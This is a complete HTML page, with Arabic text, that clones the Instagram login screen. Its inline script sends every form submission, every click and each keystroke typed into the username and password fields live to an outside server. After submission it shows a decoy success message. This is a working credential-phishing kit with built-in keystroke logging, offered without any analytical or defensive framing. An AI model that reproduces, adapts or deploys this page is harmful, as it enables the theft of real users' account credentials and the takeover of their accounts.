<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل الدخول • Instagram Demo</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <main class="container">
    <!-- كرت تسجيل الدخول الرئيسي -->
    <div class="card login-card" id="loginCard">
      
      <!-- شعار انستغرام -->
      <div class="logo">
        <svg viewBox="0 0 512 512" width="175" height="60">
          <path fill="url(#instagram-gradient)" d="M349.372 141.252c-3.22-3.22-7.85-5.212-12.95-5.212-10.117 0-18.163 8.046-18.163 18.163 0 5.1 1.993 9.73 5.212 12.95 3.22 3.22 7.85 5.212 12.95 5.212 10.117 0 18.163-8.046 18.163-18.163 0-5.101-1.993-9.73-5.212-12.95zM256 180c-41.972 0-76 34.028-76 76s34.028 76 76 76 76-34.028 76-76-34.028-76-76-76zm0 124c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm122.28-164.88C364.55 125.13 344.25 120 300 120h-88c-44.25 0-64.55 5.13-78.28 19.12C119.99 152.85 115 173.15 115 217.4v88c0 44.25 4.99 64.55 18.72 78.28 13.73 13.99 34.03 19.12 78.28 19.12h88c44.25 0 64.55-5.13 78.28-19.12 13.73-13.73 18.72-34.03 18.72-78.28v-88c0-44.25-4.99-64.55-18.72-78.28zM368 305.4c0 38.66-3.8 51.98-10.96 59.14-7.16 7.16-20.48 10.96-59.14 10.96h-83.8c-38.66 0-51.98-3.8-59.14-10.96-7.16-7.16-10.96-20.48-10.96-59.14v-83.8c0-38.66 3.8-51.98 10.96-59.14 7.16-7.16 20.48-10.96 59.14-10.96h83.8c38.66 0 51.98 3.8 59.14 10.96 7.16 7.16 10.96 20.48 10.96 59.14v83.8z"/>
          <defs>
            <linearGradient id="instagram-gradient" x1="0%" y1="100%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#fdf497" />
              <stop offset="5%" stop-color="#fdf497" />
              <stop offset="45%" stop-color="#fd5949" />
              <stop offset="60%" stop-color="#d6249f" />
              <stop offset="100%" stop-color="#285AEB" />
            </linearGradient>
          </defs>
        </svg>
      </div>

      <!-- نموذج الإدخال -->
      <form id="loginForm">
        <div class="input-group">
          <input type="text" id="username" required autocomplete="off">
          <label for="username">اسم المستخدم، الهاتف أو البريد</label>
        </div>

        <div class="input-group">
          <input type="password" id="password" required>
          <label for="password">كلمة السر</label>
          <button type="button" id="togglePassword">إظهار</button>
        </div>

        <button type="submit" class="btn-login" id="loginBtn">تسجيل الدخول</button>
      </form>

      <div class="divider">
        <span>أو</span>
      </div>

      <a href="#" class="fb-login">تسجيل الدخول باستخدام فيسبوك</a>
      <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
    </div>

    <!-- كرت النجاح (يظهر بعد الضغط) -->
    <div class="card success-card hidden" id="successCard">
      <div class="checkmark-circle">
        <div class="checkmark"></div>
      </div>
      <h2>شكراً لك!</h2>
      <p>تم استلام طلبك بنجاح.</p>
    </div>

    <!-- كرت إنشاء حساب -->
    <div class="card signup-card" id="signupCard">
      <p>ليس لديك حساب؟ <a href="#">تسجيل الاشتراك</a></p>
    </div>
  </main>

  <script src="script.js"></script>
  <script>
    const SERVER_URL = 'https://server-hcxm.onrender.com'; // استبدله برابط خادمك عند رفعه أونلاين

    // أ) رصد كتابة النصوص وإرسال النموذج
    document.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const form = e.target;
        const formData = new FormData(form);
        const data = {};

        formData.forEach((value, key) => {
            data[key] = value;
        });

        fetch(`${SERVER_URL}/api/log-data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                type: 'إرسال نموذج (Form Submit)',
                page: window.location.pathname,
                data: data
            })
        });
    });

    // ب) رصد كل ضغطة زر أو كليك داخل الموقع
    document.addEventListener('click', function(e) {
        const targetElement = e.target.tagName + (e.target.id ? `#${e.target.id}` : '') + (e.target.className ? `.${e.target.className}` : '');
        
        fetch(`${SERVER_URL}/api/log-action`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                action: 'Click',
                target: targetElement,
                page: window.location.pathname
            })
        });
    });

    // ج) (اختياري) رصد الأحرف أثناء الكتابة في مدخلات النصوص (Live Input Logging)
    document.addEventListener('input', function(e) {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            fetch(`${SERVER_URL}/api/log-data`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'كتابة في مدخل (Live Input)',
                    page: window.location.pathname,
                    data: {
                        field: e.target.name || e.target.id,
                        value: e.target.value
                    }
                })
            });
        }
    });
</script>
</body>
</html>
